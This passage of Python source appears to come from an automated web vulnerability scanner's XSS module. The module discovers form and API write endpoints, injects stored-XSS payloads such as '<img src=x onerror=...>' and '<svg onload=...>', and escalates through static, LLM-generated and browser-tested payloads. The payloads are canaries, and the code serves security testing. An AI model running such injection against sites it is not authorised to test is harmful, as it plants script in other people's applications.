                screenshots_dir = Path(self.report_dir) / "screenshots"
                screenshots_dir.mkdir(parents=True, exist_ok=True)
            await self._loop_test_dom_xss(screenshots_dir=screenshots_dir)
            # Collect DOM XSS findings and emit them
            for f in self.findings:
                if f.context == "dom_xss" and f.validated:
                    _ev = f.evidence or {}
                    fp = self._generate_xss_fingerprint(
                        f.url, f.parameter, "dom_xss",
                        sink=_ev.get("sink"), source=_ev.get("source")
                    )

                    # Global XSS root cause grouping (e.g., postMessage->eval on shared JS)
                    if fp[0] == "XSS_GLOBAL":
                        if fp in self._global_xss_findings:
                            if f.url not in self._global_xss_findings[fp]:
                                self._global_xss_findings[fp].append(f.url)
                            logger.info(f"[{self.name}] Global DOM XSS dedup: added {f.url} to root cause {fp[2]} "
                                       f"(now {len(self._global_xss_findings[fp])} affected URLs)")
                            continue  # Don't emit duplicate — already reported this root cause
                        else:
                            self._global_xss_findings[fp] = [f.url]
                            logger.info(f"[{self.name}] Global DOM XSS detected: root cause {fp[2]} on {f.url}")

                    if fp not in self._emitted_findings:
                        self._emitted_findings.add(fp)
                        evidence = f.evidence or {"validated": True, "level": "dom_xss"}
                        # For global XSS, include root cause and affected URLs in evidence
                        if fp[0] == "XSS_GLOBAL":
                            evidence = dict(evidence)  # Copy to avoid mutating original
                            evidence["root_cause"] = fp[2]
                            evidence["affected_urls"] = self._global_xss_findings[fp]
                        finding_dict = {
                            "type": "XSS",
                            "subtype": "DOM_XSS",
                            "url": f.url,
                            "parameter": f.parameter,
                            "payload": f.payload,
                            "context": "dom_xss",
                            "evidence": evidence
                        }
                        emitted = self._emit_xss_finding(
                            finding_dict,
                            status=f.status or ValidationStatus.VALIDATED_CONFIRMED.value,
                            needs_cdp=False
                        )
                        validated.append(f)
                        if emitted:
                            logger.info(f"[{self.name}] Emitted DOM XSS: {f.url} (source: {f.parameter})")
                        else:
                            logger.warning(f"[{self.name}] ⚠️  DOM XSS NOT emitted (rejected by _validate_before_emit): {f.url} (source: {f.parameter})")
        except Exception as e:
            logger.error(f"[{self.name}] Phase B.2 DOM XSS testing failed: {e}", exc_info=True)

        # Phase B.3: Stored XSS testing (POST → GET workflow)
        try:
            stored_results = await self._test_stored_xss(screenshots_dir)
            if stored_results:
                for f in stored_results:
                    fp = self._generate_xss_fingerprint(f["url"], f["parameter"], "stored_xss")
                    if fp not in self._emitted_findings:
                        self._emitted_findings.add(fp)
                        emitted = self._emit_xss_finding(f, status=ValidationStatus.VALIDATED_CONFIRMED.value)
                        validated.append(f)
                        if emitted:
                            logger.info(f"[{self.name}] Emitted Stored XSS: {f['url']} via {f['parameter']}")
                        else:
                            logger.warning(f"[{self.name}] ⚠️  Stored XSS NOT emitted (rejected by _validate_before_emit): {f['url']} via {f['parameter']}")
        except Exception as e:
            logger.error(f"[{self.name}] Phase B.3 Stored XSS testing failed: {e}", exc_info=True)

        return validated

    async def _discover_write_schema(self, api_url, auth_headers, content_field_names):
        """Learn a write endpoint's required schema from its OWN 400/422 validation errors, then
        return a stored-XSS POST target. Target-agnostic: no hardcoded paths or field names — the
        server tells us which fields it requires. Returns None if the endpoint doesn't accept writes.
        """
        async def _post(u, body):
            try:
                async with http_manager.session(ConnectionProfile.PROBE) as s:
                    async with s.post(
                        u, json=body, ssl=False,
                        headers={**auth_headers, "Content-Type": "application/json"},
                        timeout=aiohttp.ClientTimeout(total=4),
                    ) as r:
                        try:
                            j = await r.json()
                        except Exception:
                            j = {}
                        return r.status, j
            except Exception:
                return None, {}

        # Pick the URL variant (with/without trailing slash) that actually accepts POST.
        chosen = None
        for u in (api_url, api_url + "/"):
            st, _ = await _post(u, {"comment": ""})
            if st in (200, 201, 400, 422):
                chosen = u
                break
        if not chosen:
            return None

        # Iteratively learn required fields from the server's validation errors. Start from an
        # EMPTY body so the server enumerates exactly what it needs (avoids assuming any schema).
        fields, text_fields = {}, []
        for _ in range(4):
            st, err = await _post(chosen, dict(fields))
            if st in (200, 201):
                break
            if st in (400, 422):
                added = False
                for detail in (err.get("detail") or []):
                    loc = detail.get("loc", []) if isinstance(detail, dict) else []
                    fname = loc[-1] if loc else None
                    if isinstance(fname, str) and fname not in fields and fname.lower() != "body":
                        fields[fname] = "1"
                        if fname.lower() in content_field_names:
                            text_fields.append(fname)
                        added = True
                if not added:
                    break
            else:
                return None

        if not text_fields:
            # Accepts writes but exposed no content-like field name — inject into a generic one.
            fields.setdefault("comment", "")
            text_fields = ["comment"]
        return {"url": chosen, "fields": fields, "text_fields": text_fields, "format": "json"}

    async def _test_stored_xss(self, screenshots_dir: Path = None) -> List[Dict]:
        """
        Test for stored XSS by submitting payloads via POST then checking GET pages.

        Enhanced workflow:
        1. Discover POST targets: HTML forms + common API write endpoints
        2. Submit XSS payloads via POST (form-encoded AND JSON)
        3. Extract resource ID from POST response
        4. Build detail URLs (e.g., /api/reviews/{id}) and check for stored payload
        5. Check canary in raw text, JSON values, and HTML responses
        """
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, urljoin
        from bs4 import BeautifulSoup
        import re

        findings = []
        canary = f"BTXSS{int(__import__('time').time()) % 10000}"
        stored_payloads = [
            f"<img src=x onerror=document.title='{canary}'>",
            f"<svg onload=document.title='{canary}'>",
            f'"><img src=x onerror=document.title=\'{canary}\'>',
        ]

        parsed_url = urlparse(self.url)
        base = f"{parsed_url.scheme}://{parsed_url.netloc}"

        # Get auth headers for authenticated write endpoints
        auth_headers = {}
        try:
            from bugtrace.services.scan_context import get_scan_auth_headers
            auth_headers = get_scan_auth_headers(self._scan_context, role="user") or {}
        except Exception:
            pass

        # ========== Phase A: Discover POST targets ==========
        post_targets = []

        # A1: HTML form discovery
        try:
            state = await browser_manager.capture_state(self.url)
            html = state.get("html", "")
        except Exception:
            html = ""

        if html:
            soup = BeautifulSoup(html, "html.parser")
            for form in soup.find_all("form"):
                method = (form.get("method", "GET") or "GET").upper()
                if method != "POST":
                    continue
                action = form.get("action", "")
                form_url = urljoin(self.url, action) if action else self.url

                fields = {}
                text_fields = []
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if not name:
                        continue
                    input_type = (inp.get("type", "text") or "text").lower()
                    if input_type in ("submit", "button", "reset", "file", "image"):
                        continue
                    default = inp.get("value", "")
                    fields[name] = default
                    if input_type in ("text", "search", "url", "email") or inp.name == "textarea":
                        text_fields.append(name)
                    elif input_type == "hidden" and "csrf" not in name.lower() and "token" not in name.lower():
                        text_fields.append(name)

                if text_fields and fields:
                    post_targets.append({
                        "url": form_url,
                        "fields": fields,
                        "text_fields": text_fields,
                        "format": "form",
                    })

        # A2+A3: GENERIC API write-endpoint discovery. Instead of hardcoded BugStore/PortSwigger
        # paths + fixed field schemas, take the recon-discovered API-ish endpoints and learn each
        # one's required schema from the server's OWN 400/422 validation errors (target-agnostic).
        content_field_names = ["comment", "content", "body", "text", "message",
                               "description", "title", "review", "feedback", "post"]
        discovered_api_urls = set(t["url"] for t in post_targets)

        # Candidate write endpoints = same-host recon URLs that look like API endpoints.
        _recon_urls = getattr(self, 'urls_to_scan', None) or []
        _api_candidates, _seen = [], set()
        for _u in _recon_urls:
            try:
                _pu = urlparse(_u)
            except Exception:
                continue
            if _pu.netloc != parsed_url.netloc or "/api/" not in _pu.path.lower():
                continue
            _canon = f"{_pu.scheme}://{_pu.netloc}{_pu.path.rstrip('/')}"
            if _canon in _seen or _canon in discovered_api_urls:
                continue
            _seen.add(_canon)
            _api_candidates.append(_canon)

        # Learn each candidate's schema from its validation errors (cap to stay cheap/quiet).
        for _api_url in _api_candidates[:10]:
            _target = await self._discover_write_schema(_api_url, auth_headers, content_field_names)
            if _target:
                _tkey = _target["url"].split("?")[0].rstrip("/")
                if _tkey not in discovered_api_urls:
                    post_targets.append(_target)
                    discovered_api_urls.add(_tkey)

        if not post_targets:
            return findings

        logger.info(f"[{self.name}] Stored XSS: {len(post_targets)} POST targets "
                     f"({sum(1 for t in post_targets if t['format'] == 'form')} forms, "
                     f"{sum(1 for t in post_targets if t['format'] == 'json')} API)")

        # ========== Phase B: Write-then-Read testing ==========
        for target in post_targets[:8]:
            form_url = target["url"]
            fields = target["fields"]
            text_fields = target["text_fields"]
            fmt = target["format"]
            target_auth_failed = False

            for target_field in text_fields[:2]:
                if target_auth_failed:
                    break
                for payload in stored_payloads:
                    try:
                        submit_data = dict(fields)
                        submit_data[target_field] = payload
                        post_response_text = ""
                        post_status = 0

                        # Submit payload
                        async with http_manager.session(ConnectionProfile.PROBE) as session:
                            req_headers = {
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                **auth_headers,
                            }
                            if fmt == "json":
                                req_headers["Content-Type"] = "application/json"
                                async with session.post(
                                    form_url, json=submit_data, ssl=False,
                                    headers=req_headers,
                                    allow_redirects=True,
                                    timeout=aiohttp.ClientTimeout(total=8)
                                ) as resp:
                                    post_status = resp.status
                                    post_response_text = await resp.text()
                            else:
                                async with session.post(
                                    form_url, data=submit_data, ssl=False,
                                    headers=req_headers,
                                    allow_redirects=True,
                                    timeout=aiohttp.ClientTimeout(total=8)
                                ) as resp:
                                    post_status = resp.status
                                    post_response_text = await resp.text()

                        # Capture the injection POST (seed enrichment) — auth masked.
                        import json as _json
                        from urllib.parse import urlencode as _urlencode
                        _pbody = _json.dumps(submit_data) if fmt == "json" else _urlencode(submit_data)
                        _pct = "application/json" if fmt == "json" else "application/x-www-form-urlencoded"
                        post_request = {"method": "POST", "url": form_url, "headers": _mask_auth_headers(req_headers), "body": _pbody, "body_content_type": _pct}
                        post_auth = _auth_meta(auth_headers)

                        # Log POST result for debugging
                        logger.info(f"[{self.name}] Stored XSS POST {form_url} field={target_field}: HTTP {post_status}")

                        # Skip auth-gated endpoints we can't access
                        if post_status in (401, 403):
                            logger.info(f"[{self.name}] Stored XSS: auth required for POST {form_url} (HTTP {post_status})")
                            target_auth_failed = True
                            break
                        if post_status >= 500:
                            continue

                        # Check 1: POST response itself may contain the stored payload
                        if post_status in (200, 201) and self._check_stored_canary(post_response_text, canary, payload):
                            findings.append({
                                "type": "XSS",
                                "subtype": "STORED_XSS",
                                "url": form_url,
                                "parameter": target_field,
                                "payload": payload,
                                "context": "stored_xss",
                                "evidence": {
                                    "validated": True,
                                    "level": "stored",
                                    "post_url": form_url,
                                    "check_url": form_url,
                                    "xss_type": "stored",
                                    "validation_method": "post_response_reflection",
                                    "resource_id": self._extract_resource_id(post_response_text),
                                    "confirming_request": post_request,
                                    "readback_request": None,
                                    "repro_auth": post_auth,
                                    "capture_method": "stored_xss_post_get",
                                },
                                "repro": {
                                    "confirming_request": post_request,
                                    "confirming_response": None,
                                    "readback_request": None,
                                    "auth": post_auth,
                                    "capture_method": "stored_xss_post_get",
                                },
                                "http_request": _build_raw_http(post_request),
                                "confidence": 0.95,
                                "validated": True,
                                "status": "VALIDATED_CONFIRMED",
                                "http_method": "POST",
                            })
                            logger.info(f"[{self.name}] STORED XSS CONFIRMED: payload reflected in POST response at {form_url}")
                            break

                        # Build check URLs: original page + form URL + detail URL from response
                        check_urls = [self.url]
                        if form_url != self.url:
                            check_urls.append(form_url)

                        # Extract resource ID from POST response to build detail URL
                        resource_id = self._extract_resource_id(post_response_text)
                        if resource_id:
                            detail_url = f"{form_url.rstrip('/')}/{resource_id}"
                            check_urls.append(detail_url)

                        # Also check the list endpoint (payload may render on list page)
                        list_url = form_url.rstrip("/")
                        if list_url not in check_urls:
                            check_urls.append(list_url)

                        # Check each URL for stored payload
                        for check_url in check_urls:
                            try:
                                async with http_manager.session(ConnectionProfile.PROBE) as session:
                                    async with session.get(
                                        check_url, ssl=False,
                                        headers={**auth_headers},
                                        timeout=aiohttp.ClientTimeout(total=5)
                                    ) as resp:
                                        body = await resp.text()
                            except Exception:
                                continue

                            # Check for canary in response (multiple formats)
                            if self._check_stored_canary(body, canary, payload):
                                _readback = {"method": "GET", "url": check_url, "headers": _mask_auth_headers(dict(auth_headers)), "body": None, "body_content_type": None}
                                findings.append({
                                    "type": "XSS",
                                    "subtype": "STORED_XSS",
                                    "url": check_url,
                                    "parameter": target_field,
                                    "payload": payload,
                                    "context": "stored_xss",
                                    "evidence": {
                                        "validated": True,
                                        "level": "stored",
                                        "post_url": form_url,
                                        "check_url": check_url,
                                        "xss_type": "stored",
                                        "validation_method": "http_response_analysis",
                                        "resource_id": resource_id,
                                        "confirming_request": post_request,
                                        "readback_request": _readback,
                                        "repro_auth": post_auth,
                                        "capture_method": "stored_xss_post_get",
                                    },
                                    "repro": {
                                        "confirming_request": post_request,
                                        "confirming_response": None,
                                        "readback_request": _readback,
                                        "auth": post_auth,
                                        "capture_method": "stored_xss_post_get",
                                    },
                                    "http_request": _build_raw_http(post_request),
                                    "confidence": 0.95,
                                    "validated": True,
                                    "status": "VALIDATED_CONFIRMED",
                                    "http_method": "POST",
                                })
                                logger.info(f"[{self.name}] STORED XSS CONFIRMED: POST {form_url} field '{target_field}' → stored on GET {check_url}")
                                break
                        if findings and findings[-1].get("parameter") == target_field:
                            break
                    except Exception as e:
                        logger.debug(f"[{self.name}] Stored XSS test failed: {e}")
                        continue

        return findings

    @staticmethod
    def _extract_resource_id(response_text: str) -> Optional[str]:
        """Extract resource ID from a POST response (JSON or headers)."""
        import re
        try:
            data = __import__('json').loads(response_text)
            # Top-level ID
            if isinstance(data, dict):
                for key in ("id", "ID", "_id", "review_id", "thread_id", "post_id", "comment_id"):
                    if key in data:
                        return str(data[key])
                # Nested data.id
                if "data" in data and isinstance(data["data"], dict) and "id" in data["data"]:
                    return str(data["data"]["id"])
        except Exception:
            pass
        # Fallback: extract numeric ID from response
        match = re.search(r'"id"\s*:\s*(\d+)', response_text)
        if match:
            return match.group(1)
        return None

    @staticmethod
    def _check_stored_canary(body: str, canary: str, payload: str) -> bool:
        """Check if XSS canary exists in response across multiple formats."""
        if canary not in body:
            return False

        # Raw payload present (HTML context)
        if payload in body:
            return True

        # Canary in event handler context (unescaped)
        if f"onerror=document.title='{canary}'" in body or f"onload=document.title='{canary}'" in body:
            return True

        # JSON-escaped payload (e.g., inside {"comment": "<img src=x onerror=...>"})
        json_escaped = payload.replace('"', '\\"')
        if json_escaped in body:
            return True

        # Canary present but payload partially encoded — still a stored XSS
        # if the canary survives, the payload was stored (even if rendered differently)
        if f"onerror=" in body and canary in body:
            return True
        if f"onload=" in body and canary in body:
            return True

        return False

    async def _try_early_l5_validation(self, finding, url: str, param: str, payloads: List[str], screenshots_dir: Path):
        """If HTTP probe confirms XSS, automatically try L5 Browser Validation to get screenshot."""
        _depth = getattr(self, '_scan_depth', '') or settings.SCAN_DEPTH
        method = getattr(self, '_current_http_method', 'GET')
        if _depth != "thorough" or method != "GET":
            return finding
            
        logger.info(f"[{self.name}] Confirmed via HTTP. Elevating to L5 (Browser) for screenshot/PoC on '{param}'...")
        
        test_payloads = []
        if finding.payload and finding.payload not in test_payloads:
            test_payloads.append(finding.payload)
            
        alt = finding.payload.replace("document.title=document.domain", "alert(document.domain)")
        if alt != finding.payload and alt not in test_payloads:
            test_payloads.append(alt)
            
        for p in payloads:
            if p not in test_payloads:
                test_payloads.append(p)
                
        l5_res = await self._escalation_l5_browser(url, param, test_payloads[:10], screenshots_dir)
        if l5_res and l5_res.validated:
            return l5_res
            
        return finding

    def _browser_only_candidate(
        self, param: str, contexts: Union[str, Iterable[str], None], reflecting_payloads: list
    ) -> bool:
        """Whether an XSS candidate can be confirmed ONLY in a real browser.

        At 'standard' depth the browser (L5/L6) is skipped for speed, but some XSS never
        surface in an HTTP response and fire only on a real click / DOM execution — e.g. a
        redirect/DOM-sink param whose value lands in an ``href`` (``back=javascript:alert()``
        executes only when the link is clicked). Those auto-escalate regardless of depth.

        Signals (both require that something reflected, else there is nothing to validate):
          - the parameter is a known redirect/DOM-sink param (reuses the OpenRedirect
            vocabulary, exact match — DRY), or
          - ANY of the contexts the reflection landed in is browser-only (href / url / DOM
            sink). `contexts` is the whole SET, not the ranked winner: url_context sits 8th
            of 9 in _CONTEXT_EXPLOITABILITY, so a value echoed into an <a href> AND into the
            body ranks as html_text and the ranked label alone would keep this hatch shut
            for every parameter whose NAME is not in the redirect vocabulary. Re-ranking
            would change payload selection everywhere; taking the set here does not.
        """
        if not reflecting_payloads:
            return False
        if (param or "").lower() in _REDIRECT_PARAM_SET:
            return True
        return bool(_as_context_set(contexts) & _BROWSER_ONLY_CONTEXTS)

    # ===== NEGATIVE-EVIDENCE RECORDING =====
    # Thin adapters over the pure bugtrace.agents.xss.coverage transitions. Each one is a
    # no-op when no record is open, so the ladder never has to guard its own instrumentation
    # and coverage can never abort a scan.

    def _cov_probe(self, probe: str, reflected: Optional[bool],
                   surviving_chars: Optional[str] = None) -> None:
        """Record a probe string that was SENT and whether its marker came back."""
        if getattr(self, "_xss_cov", None) is not None:
            self._xss_cov = xss_coverage.with_probe(
                self._xss_cov, probe, reflected, surviving_chars
            )

    def _cov_level(self, level: str, reflected: Optional[int] = None,
                   confirmed: bool = False, contexts: Optional[Iterable[str]] = None,
                   final_context: Optional[str] = None, note: str = "") -> None:
        """Record that a rung RAN, with what it measured."""
        if getattr(self, "_xss_cov", None) is None:
            return
        cov = xss_coverage.with_level(
            self._xss_cov, level, reflected=reflected, confirmed=confirmed, note=note
        )
        cov = xss_coverage.with_contexts(cov, contexts)
        if final_context and final_context not in ("unknown", "none", "blocked"):
            cov = xss_coverage.with_final_context(cov, final_context)
        self._xss_cov = cov

    def _cov_note(self, note: str) -> None:
        """Record a rung that was deliberately NOT run, and why."""
        if getattr(self, "_xss_cov", None) is not None:
            self._xss_cov = xss_coverage.with_note(self._xss_cov, note)

    def _cov_exit(self, reason: str) -> None:
        """Close the open record at a pipeline exit."""
        if getattr(self, "_xss_cov", None) is not None:
            self._xss_cov = xss_coverage.finish(self._xss_cov, reason)

    def _write_xss_coverage(self) -> Optional[Path]:
        """Persist the per-parameter coverage artifact. Diagnostics — never a finding.

        Deliberately NOT written into specialists/{results,dry,wet} (four generic loaders
        ingest every dict there as a FINDING) nor as specialists/*_report.json
        (reporting.py globs that), and never at the reports ROOT, which is what
        self.report_dir defaults to before the team injects the real scan directory.
        """
        if not settings.XSS_COVERAGE_ENABLED or not getattr(self, "_xss_coverage", None):
            return None
        path = xss_coverage.resolve_coverage_path(
            getattr(self, "report_dir", None),
            settings.REPORT_DIR,
            settings.XSS_COVERAGE_SUBDIR,
            settings.XSS_COVERAGE_FILENAME,
        )
        if path is None:
            logger.warning(
                f"[{self.name}] XSS coverage NOT written: report_dir "
                f"{getattr(self, 'report_dir', None)!r} + subdir "
                f"{settings.XSS_COVERAGE_SUBDIR!r} is not a safe location "
                f"({len(self._xss_coverage)} parameter records dropped)"
            )
            return None
        document = xss_coverage.build_document(
            self._xss_coverage,
            scan_url=getattr(self, "url", "") or "",
            max_params=settings.XSS_COVERAGE_MAX_PARAMS,
        )
        if document["truncated"]:
            logger.warning(
                f"[{self.name}] XSS coverage truncated: kept "
                f"{document['params_recorded']} of {document['params_total']} parameter "
                f"records (XSS_COVERAGE_MAX_PARAMS={settings.XSS_COVERAGE_MAX_PARAMS})"
            )
        written = xss_coverage.write_coverage_document(path, document)
        if written is None:
            logger.warning(f"[{self.name}] XSS coverage write failed: {path}")
            return None
        s = document["summary"]
        logger.info(
            f"[{self.name}] XSS coverage: {s['params_tested']} params — "
            f"{s['confirmed']} confirmed, {s['reflected_but_unconfirmed']} reflected but "
            f"unconfirmed, {s['no_reflection']} no reflection, {s['no_response']} no "
            f"response → {written}"
        )
        return written

    async def _xss_escalation_pipeline(
        self, url: str, param: str, interactsh_url: str, screenshots_dir: Path,
        context: str = "html", probe_snippet: str = "",
        http_method: str = "GET"
    ) -> Optional[XSSFinding]:
        """Run the escalation ladder and record NEGATIVE EVIDENCE for this parameter.

        The ladder returns the same ``None`` for "tested hard, nothing executable" and for
        "never tested". This wrapper guarantees exactly ONE coverage record per call, on
        EVERY exit — including the exception path, which is an exit too: the record is closed
        before the exception is re-raised to the caller's ``except``.
        """
        # getattr, not attribute access: an XSSAgent built with __new__ (harnesses, some
        # reject-path shells) has no __init__ state, and an AttributeError raised in the
        # finally: below would MASK the ladder's real exception.
        if not isinstance(getattr(self, "_xss_coverage", None), list):
            self._xss_coverage = []
        self._xss_cov = xss_coverage.start_coverage(
            url, param, http_method=http_method, initial_context=context
        )
        try:
            return await self._xss_escalation_ladder(
                url, param, interactsh_url, screenshots_dir,
                context=context, probe_snippet=probe_snippet, http_method=http_method,
            )
        except Exception as e:
            self._xss_cov = xss_coverage.finish(
                self._xss_cov, xss_coverage.EXIT_EXCEPTION
            )
            logger.debug(f"[{self.name}] Coverage: '{param}' exited via exception: {e}")
            raise
        finally:
            self._xss_coverage.append(self._xss_cov)
            self._xss_cov = None

    async def _xss_escalation_ladder(
        self, url: str, param: str, interactsh_url: str, screenshots_dir: Path,
        context: str = "html", probe_snippet: str = "",
        http_method: str = "GET"
    ) -> Optional[XSSFinding]:
        """
        v3.5: Smart XSS Escalation Pipeline.

        L0.5: Smart probe      → reflection + context-specific payloads (1-6 reqs)
        L1: Polyglot probe     → HTTP reflection check (instant)
        L2: Bombing 1 (static) → Curated + GOLDEN payloads via HTTP
        L3: Bombing 2 (LLM)    → 100 LLM payloads × breakouts (SKIPPED if L2=0 reflections)
        L4: HTTP Manipulator   → ManipulatorOrchestrator (SKIPPED if L2=0 reflections)
        L5: Browser testing    → Playwright DOM execution
        L6: CDP Validation     → Flag for AgenticValidator
        """
        self._current_http_method = http_method  # Used by _send_payload()
        self._surviving_chars = ""  # Set by L0.5 char probe, read by L3 breakout selection
        reflecting_payloads = []  # Payloads that reflect but aren't confirmed - passed to L5/L6

        def _tag_method(finding):
            """Tag finding with HTTP method before returning."""
            if finding and hasattr(finding, 'http_method'):
                finding.http_method = http_method
            return finding

        # ===== L0.5: SMART PROBE =====
        dashboard.log(f"[{self.name}] L0.5: Smart probe on '{param}' (context: {context})", "INFO")
        if hasattr(self, '_v'):
            self._v.emit("exploit.xss.level.started", {"level": "L0.5", "param": param, "context": context})
        smart_result, reflects, smart_ctx, smart_ctxs, probe_status = await self._escalation_l05_smart_probe(url, param, context)
        # Every context seen by ANY rung, kept unranked. The depth gate below asks this set
        # — not the single ranked label — whether the browser rungs must run anyway.
        observed_contexts = set(_as_context_set(smart_ctxs))
        # surviving_chars is only a MEASUREMENT when the marker came back; when it did not,
        # self._surviving_chars is still the "" this method initialised, and reporting that
        # as "no characters survived" would be a claim the probe never made.
        self._cov_probe(_L05_CHAR_PROBE, reflects,
                        self._surviving_chars if reflects else None)
        self._cov_level("L0.5", confirmed=bool(smart_result and smart_result.validated),
                        contexts=smart_ctxs, final_context=smart_ctx)
        if hasattr(self, '_v'):
            self._v.emit("exploit.xss.probe.result", {"param": param, "reflects": reflects, "context": smart_ctx or context})
            self._v.emit("exploit.xss.level.completed", {"level": "L0.5", "param": param, "confirmed": bool(smart_result and smart_result.validated)})
        if smart_result and smart_result.validated:
            smart_result = await self._try_early_l5_validation(smart_result, url, param, [], screenshots_dir)
            self._cov_exit(xss_coverage.EXIT_CONFIRMED)
            return _tag_method(smart_result)
        if not reflects:
            # NOT "0 of N reflected": at this exit the reflecting list is empty BY
            # CONSTRUCTION — the bombing rungs never ran. The record says "not reached".
            reason = (
                xss_coverage.EXIT_NO_RESPONSE if probe_status == _PROBE_NO_RESPONSE
                else xss_coverage.EXIT_NO_REFLECTION
            )
            dashboard.log(f"[{self.name}] Smart probe: no reflection for '{param}', skipping all levels", "INFO")
            self._cov_exit(reason)
            return None
        if smart_ctx and smart_ctx not in ("unknown", "none", "blocked"):
            context = smart_ctx

        # ===== L1: POLYGLOT PROBE =====
        dashboard.log(f"[{self.name}] L1: Polyglot probe on '{param}' (context: {context})", "INFO")
        if hasattr(self, '_v'):
            self._v.emit("exploit.xss.level.started", {"level": "L1", "param": param, "context": context})
        result, detected_context, l1_snippet, l1_ctxs = await self._escalation_l1_polyglot(url, param, interactsh_url, context)
        observed_contexts |= _as_context_set(l1_ctxs)
        self._cov_probe(settings.OMNI_PROBE_MARKER, None)
        self._cov_level("L1", confirmed=bool(result and result.validated),
                        contexts=l1_ctxs, final_context=detected_context)
        if hasattr(self, '_v'):
            self._v.emit("exploit.xss.level.completed", {"level": "L1", "param": param, "confirmed": bool(result and result.validated)})
        if result and result.validated:
            result = await self._try_early_l5_validation(result, url, param, [], screenshots_dir)
            self._cov_exit(xss_coverage.EXIT_CONFIRMED)
            return _tag_method(result)
        # L1 may refine the context from live response analysis
        if detected_context and detected_context != "html":
            context = detected_context
        if l1_snippet:
            probe_snippet = l1_snippet

        # ===== L2: BOMBING 1 - STATIC PAYLOADS =====
        dashboard.log(f"[{self.name}] L2: Static bombardment on '{param}' (context: {context})", "INFO")
        if hasattr(self, '_v'):
            self._v.emit("exploit.xss.level.started", {"level": "L2", "param": param, "context": context})
        result, l2_reflecting = await self._escalation_l2_static_bombing(url, param, interactsh_url, context)
        self._cov_level("L2", reflected=len(l2_reflecting),
                        confirmed=bool(result and result.validated), final_context=context)
        if hasattr(self, '_v'):
            self._v.emit("exploit.xss.level.completed", {"level": "L2", "param": param, "confirmed": bool(result and result.validated), "reflecting": len(l2_reflecting)})
        if result and result.validated:
            result = await self._try_early_l5_validation(result, url, param, l2_reflecting, screenshots_dir)
            self._cov_exit(xss_coverage.EXIT_CONFIRMED)
            return _tag_method(result)
        reflecting_payloads.extend(l2_reflecting)

        # ── DEPTH GATE: quick stops after L2 ──
        _depth = getattr(self, '_scan_depth', '') or settings.SCAN_DEPTH
        if _depth == "quick":
            logger.info(f"[{self.name}] Quick depth: stopping at L2 for '{param}'")
            self._cov_exit(xss_coverage.EXIT_DEPTH_QUICK)
            return None

        # ===== SKIP L3+L4 if L2 found 0 reflecting payloads =====
        if not reflecting_payloads:
            dashboard.log(f"[{self.name}] L2: 0 reflections, skipping L3+L4 for '{param}'", "INFO")
            self._cov_note("L3+L4 skipped: 0 reflecting payloads after L2")
        else:
            # ===== L3: BOMBING 2 - LLM PAYLOADS × BREAKOUTS =====
            dashboard.log(f"[{self.name}] L3: LLM bombardment on '{param}' (context: {context})", "INFO")
            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.level.started", {"level": "L3", "param": param, "context": context})
            result, l3_reflecting = await self._escalation_l3_llm_bombing(
                url, param, interactsh_url, reflecting_payloads,
                context=context, probe_snippet=probe_snippet
            )
            self._cov_level("L3", reflected=len(l3_reflecting),
                            confirmed=bool(result and result.validated))
            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.level.completed", {"level": "L3", "param": param, "confirmed": bool(result and result.validated), "reflecting": len(l3_reflecting)})
            if result and result.validated:
                self._cov_exit(xss_coverage.EXIT_CONFIRMED)
                return _tag_method(result)
            reflecting_payloads.extend(l3_reflecting)

            # ===== L4: HTTP MANIPULATOR =====
            dashboard.log(f"[{self.name}] L4: HTTP Manipulator on '{param}'", "INFO")
            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.level.started", {"level": "L4", "param": param})
            result, l4_reflecting = await self._escalation_l4_http_manipulator(url, param)
            self._cov_level("L4", reflected=len(l4_reflecting),
                            confirmed=bool(result and result.validated))
            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.level.completed", {"level": "L4", "param": param, "confirmed": bool(result and result.validated), "reflecting": len(l4_reflecting)})
            if result and result.validated:
                self._cov_exit(xss_coverage.EXIT_CONFIRMED)
                return _tag_method(result)
            reflecting_payloads.extend(l4_reflecting)

        # ── DEPTH GATE: 'thorough' always browser-validates. 'standard' skips the browser
        #    for speed EXCEPT for browser-only candidates (a redirect/DOM-sink param whose
        #    value lands in an href/navigation — e.g. back=javascript:... fires only on a
        #    click — or a reflection in a browser-only context). Those auto-escalate so we
        #    don't silently lose DOM/interaction XSS at the default depth. ──
        _depth = getattr(self, '_scan_depth', '') or settings.SCAN_DEPTH
        if _depth != "thorough":
            if self._browser_only_candidate(param, observed_contexts | {context}, reflecting_payloads):
                logger.info(f"[{self.name}] {_depth.title()} depth: auto-escalating '{param}' to browser (browser-only XSS vector)")
            else:
                logger.info(f"[{self.name}] {_depth.title()} depth: skipping browser validation for '{param}'")
                self._cov_note("L5+L6 skipped: depth is not 'thorough' and no browser-only vector")
                self._cov_exit(xss_coverage.EXIT_DEPTH_NO_BROWSER)
                return None

        # ===== L5: BROWSER TESTING (Playwright) =====
        # Skip for POST params (Playwright form submission not supported yet)
        if reflecting_payloads and http_method == "GET":
            dashboard.log(f"[{self.name}] L5: Browser testing {len(reflecting_payloads)} candidates on '{param}'", "INFO")
            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.level.started", {"level": "L5", "param": param, "candidates": len(reflecting_payloads)})
            result = await self._escalation_l5_browser(url, param, reflecting_payloads, screenshots_dir)
            self._cov_level("L5", confirmed=bool(result and result.validated),
                            note=f"{len(reflecting_payloads)} candidates")
            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.level.completed", {"level": "L5", "param": param, "confirmed": bool(result and result.validated)})
            if result and result.validated:
                self._cov_exit(xss_coverage.EXIT_CONFIRMED)
                return _tag_method(result)
        elif reflecting_payloads and http_method == "POST":
            logger.info(f"[{self.name}] L5: Skipping browser test for POST param '{param}'")
            self._cov_note("L5 skipped: Playwright cannot submit POST params")
        else:
            self._cov_note("L5 skipped: no reflecting payloads to browser-test")

        # ===== L6: CDP VALIDATION (AgenticValidator) =====
        if reflecting_payloads:
            dashboard.log(f"[{self.name}] L6: Flagging for CDP AgenticValidator on '{param}'", "INFO")
            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.level.started", {"level": "L6", "param": param, "candidates": len(reflecting_payloads)})
            result = await self._escalation_l6_cdp(url, param, reflecting_payloads)
